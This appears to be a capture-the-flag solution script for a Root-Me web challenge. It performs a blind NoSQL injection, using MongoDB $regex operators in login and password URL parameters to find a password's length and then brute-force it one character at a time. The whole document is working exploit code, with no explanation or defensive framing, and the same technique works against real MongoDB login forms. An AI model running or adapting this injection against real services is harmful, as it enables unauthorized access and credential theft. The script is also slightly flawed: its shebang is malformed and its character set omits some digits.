#!/bin/python3 env
import requests
import string
s = requests.session()
login="^((?!admin|test).)*$"
password=""
def getPasslength(login):
	length= 1
	while True:
		url="http://challenge01.root-me.org/web-serveur/ch38/?login[$regex]=%s&pass[$regex]=.{%d}"%(login,length)
		res=s.get(url)
		if "Bad username" in res.text:
			break
		length+=1

	return length-2

chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456%@_"

length=getPasslength(login)
print "pass length = %d"%length

while(length>0):
	for i in chars:
		url="http://challenge01.root-me.org/web-serveur/ch38/?login=%s&pass[$regex]=%s%s.{%d}"%(login,password,i,length)
		res = s.get(url)
		if("Bad username" not in res.text):
			password+=i
			length-=1
	print password

